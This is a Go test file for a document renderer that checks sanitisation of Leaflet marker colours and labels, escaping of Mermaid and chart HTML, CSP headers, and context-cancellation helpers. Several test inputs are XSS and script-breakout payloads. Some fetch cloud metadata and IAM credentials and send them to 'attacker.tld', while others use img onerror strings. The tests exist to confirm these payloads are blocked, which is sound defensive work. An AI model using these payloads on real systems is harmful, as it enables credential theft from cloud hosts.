// Copyright 2026 Misael Monterroca
// SPDX-License-Identifier: Apache-2.0

package chromium

import (
	"context"
	"strings"
	"testing"
	"time"

	"go.ziradocs.com/core/renderer"
)

func TestSanitizeLeafletMarkerColor(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{name: "valid color passes through", input: "red", expected: "red"},
		{name: "valid color uppercase is normalized", input: "RED", expected: "red"},
		{name: "empty falls back to blue", input: "", expected: "blue"},
		{name: "hex color is rejected (not an icon name)", input: "#2196F3", expected: "blue"},
		{name: "valid CSS color not in icon set is rejected", input: "coral", expected: "blue"},
		{
			name:     "JS breakout payload is rejected",
			input:    `blue.png'});fetch('http://169.254.169.254/latest/meta-data/').then(t=>new Image().src='http://attacker.tld/x?d='+t);({a:'`,
			expected: "blue",
		},
		{name: "whitespace is trimmed", input: "  green  ", expected: "green"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := renderer.SanitizeLeafletMarkerColor(tt.input)
			if got != tt.expected {
				t.Errorf("renderer.SanitizeLeafletMarkerColor(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func TestGenerateLeafletHTML_MarkerColorInjection(t *testing.T) {
	r := &ChromiumRenderer{}
	config := renderer.MapConfig{
		CenterLat: 40.0,
		CenterLng: -74.0,
		Zoom:      10,
		Markers: []renderer.MapMarker{
			{
				Lat:   40.0,
				Lng:   -74.0,
				Label: "hi",
				Color: `red'});fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(t=>new Image().src='http://attacker.tld/x?d='+btoa(t));({a:'`,
			},
		},
	}

	html := r.generateLeafletHTML(config, 800, 600)

	if strings.Contains(html, "fetch(") || strings.Contains(html, "attacker.tld") {
		t.Errorf("marker color breakout was not neutralized, got HTML:\n%s", html)
	}
	if !strings.Contains(html, "marker-icon-2x-blue.png") {
		t.Error("expected sanitized color to fall back to the 'blue' icon")
	}
}

func TestGenerateLeafletHTML_MarkerLabelScriptBreakout(t *testing.T) {
	r := &ChromiumRenderer{}
	config := renderer.MapConfig{
		CenterLat: 40.0,
		CenterLng: -74.0,
		Zoom:      10,
		Markers: []renderer.MapMarker{
			{
				Lat:   40.0,
				Lng:   -74.0,
				Label: `</script><script>fetch('http://169.254.169.254/latest/meta-data/')</script>`,
				Color: "red",
			},
		},
	}

	html := r.generateLeafletHTML(config, 800, 600)

	// El label llega sin HTML-escapar desde el path DOCX (docx.go construye
	// renderer.MapMarker directo desde el AST, sin pasar por
	// ProcessVariablesSecure). El único guard es la cadena de escapes de
	// generateLeafletHTML, que debe romper la secuencia "</script" para que
	// el tokenizer HTML no cierre el <script> antes de que corra el JS.
	if strings.Contains(html, "</script><script>fetch(") {
		t.Errorf("marker label </script> breakout was not neutralized, got HTML:\n%s", html)
	}
	if !strings.Contains(html, `<\/script>`) {
		t.Error("expected the '/' in a literal </script> sequence to be escaped as \\/")
	}
}

func TestGenerateLeafletHTML_MarkerLabelWithSlash(t *testing.T) {
	r := &ChromiumRenderer{}
	config := renderer.MapConfig{
		Zoom: 5,
		Markers: []renderer.MapMarker{
			{Lat: 1, Lng: 2, Label: "km 12/34 - N/S border", Color: "green"},
		},
	}

	html := r.generateLeafletHTML(config, 800, 600)

	if !strings.Contains(html, `km 12\/34 - N\/S border`) {
		t.Error("expected a legitimate label with slashes to survive (escaped, not stripped)")
	}
}

func TestGenerateLeafletHTML_CSP(t *testing.T) {
	r := &ChromiumRenderer{}
	html := r.generateLeafletHTML(renderer.MapConfig{Zoom: 5}, 800, 600)

	if !strings.Contains(html, `Content-Security-Policy`) {
		t.Fatal("expected a CSP meta tag in the generated map HTML")
	}
	if !strings.Contains(html, "connect-src 'none'") {
		t.Error("expected connect-src 'none' to block exfiltration via fetch/XHR")
	}
	if !strings.Contains(html, "img-src") || strings.Contains(html, "img-src *") {
		t.Error("expected img-src to be restricted (not wildcard) to block Image()-based exfiltration")
	}
}

func TestBuildMermaidSVGHTML_EscapesContent(t *testing.T) {
	payload := `</div><img src=x onerror=alert(document.domain)><script>alert(1)</script>`
	html := buildMermaidSVGHTML(payload)

	if strings.Contains(html, "<img src=x onerror") || strings.Contains(html, "<script>alert(1)</script>") {
		t.Errorf("mermaid content was not escaped, breakout survived:\n%s", html)
	}
	if !strings.Contains(html, "&lt;img") {
		t.Error("expected escaped payload to appear as HTML entities")
	}
	if !strings.Contains(html, "securityLevel: 'strict'") || !strings.Contains(html, "htmlLabels: false") {
		t.Error("expected mermaid.initialize to set securityLevel:'strict' and htmlLabels:false")
	}
	if !strings.Contains(html, "Content-Security-Policy") || !strings.Contains(html, "connect-src 'none'") {
		t.Error("expected a restrictive CSP meta tag")
	}
}

func TestBuildMermaidPNGHTML_EscapesContent(t *testing.T) {
	payload := `</div><img src=x onerror=alert(document.domain)>`
	html := buildMermaidPNGHTML(payload, 400, 300)

	if strings.Contains(html, "<img src=x onerror") {
		t.Errorf("mermaid content was not escaped, breakout survived:\n%s", html)
	}
	if !strings.Contains(html, "securityLevel: 'strict'") || !strings.Contains(html, "htmlLabels: false") {
		t.Error("expected mermaid.initialize to set securityLevel:'strict' and htmlLabels:false")
	}
	if !strings.Contains(html, "Content-Security-Policy") {
		t.Error("expected a CSP meta tag")
	}
}

func TestBuildChartHTML_CSP(t *testing.T) {
	// chartConfig llega ya re-serializado (json.Marshal) desde el llamador;
	// este test solo verifica las defensas propias del template (CSP), no
	// el re-encoding upstream (cubierto en html.go).
	html := buildChartHTML(`{"type":"bar","data":{}}`, 400, 300)

	if !strings.Contains(html, "Content-Security-Policy") {
		t.Fatal("expected a CSP meta tag in the generated chart HTML")
	}
	if !strings.Contains(html, "connect-src 'none'") {
		t.Error("expected connect-src 'none' to block exfiltration via fetch/XHR")
	}
}

// TestWithCallerCancel_PropagatesCallerCancellation cubre el mecanismo del
// que dependen los 7 Render* de este archivo para respetar la cancelación
// puntual de un caller (issue #134/G1d): cancelar callerCtx debe cerrar el
// context derivado, sin esperar a que base termine por su cuenta.
func TestWithCallerCancel_PropagatesCallerCancellation(t *testing.T) {
	base := context.Background()
	callerCtx, callerCancel := context.WithCancel(context.Background())

	derived, cancel := withCallerCancel(base, callerCtx)
	defer cancel()

	select {
	case <-derived.Done():
		t.Fatal("derived context should not be done before callerCtx is canceled")
	default:
	}

	callerCancel()

	select {
	case <-derived.Done():
		// esperado
	case <-time.After(2 * time.Second):
		t.Fatal("derived context did not observe callerCtx cancellation")
	}
}

// TestWithCallerCancel_NilCallerCtxNeverCancels cubre el caso de los Render*
// invocados con ctx==nil (p. ej. callers internos que todavía no propagan
// uno) — no debe haber panic ni cancelación espuria por el watcher.
func TestWithCallerCancel_NilCallerCtxNeverCancels(t *testing.T) {
	base, baseCancel := context.WithCancel(context.Background())
	defer baseCancel()

	derived, cancel := withCallerCancel(base, nil)
	defer cancel()

	select {
	case <-derived.Done():
		t.Fatal("derived context should not be done when neither base nor a nil callerCtx has been canceled")
	case <-time.After(100 * time.Millisecond):
		// esperado: sigue vivo
	}
}

// TestWithCallerCancel_CancelFuncIsIdempotent cubre un hallazgo de code
// review sobre PR #178: el contrato stdlib de context.CancelFunc garantiza
// que llamarlo más de una vez es un no-op seguro (context.WithCancel lo
// implementa así) — un caller que cancele explícito en un branch de salida
// rápida y además conserve `defer cancel()` como red de seguridad (patrón
// común en Go) llamaría el CancelFunc retornado por withCallerCancel dos
// veces. Antes de este fix, la segunda llamada hacía close(done) sobre un
// channel ya cerrado y paniqueaba.
func TestWithCallerCancel_CancelFuncIsIdempotent(t *testing.T) {
	callerCtx, callerCancel := context.WithCancel(context.Background())
	defer callerCancel()

	_, cancel := withCallerCancel(context.Background(), callerCtx)

	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("calling the returned CancelFunc twice must be a safe no-op, got panic: %v", r)
		}
	}()
	cancel()
	cancel()
}
